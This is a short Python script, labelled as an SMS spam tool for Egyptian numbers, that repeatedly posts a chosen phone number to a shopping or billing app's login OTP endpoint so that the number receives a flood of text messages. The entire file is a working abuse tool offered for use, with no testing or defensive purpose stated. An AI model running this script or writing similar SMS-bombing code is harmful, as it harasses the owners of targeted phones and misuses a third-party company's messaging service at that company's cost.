import requests

def send_otp_requests(phone, num_requests):
    url = "https://fatura-app.com/auth/otp/send"
    payload = {
        "type": "login",
        "phone": phone,
        "otp": None
    }
    
    for i in range(1, num_requests + 1):
        response = requests.post(url, json=payload)
        if response.status_code == 200:
            print(f"Done Sent {i} messages")
        else:
            print(f"Failed to send message {i}")

if __name__ == "__main__":
    print('Sms spam Egy Numbers By Ghalwash @Mrfa0gh')
    print('')
    phone = input("Enter phone number: ")
    num_requests = int(input("Enter number of requests: "))
    send_otp_requests(phone, num_requests)
